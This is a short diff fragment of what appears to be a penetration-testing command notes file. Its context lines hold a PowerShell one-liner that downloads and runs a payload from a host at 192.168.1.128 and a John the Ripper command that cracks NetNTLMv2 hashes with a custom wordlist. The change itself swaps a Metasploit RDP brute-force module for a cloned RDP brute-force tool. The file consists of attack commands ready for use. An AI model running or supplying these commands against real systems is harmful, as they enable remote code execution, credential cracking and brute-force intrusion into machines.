@@ -19,7 +19,7 @@ IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.128:8080/payload
 
 john --wordlist=wordlist_personalizada_advanced.txt --format=netntlmv2 hash_john.txt
 
-use auxiliary/scanner/rdp/rdp_brute
+git clone https://github.com/zerobyte-id/rdp_brute_for_msf
 
 
 
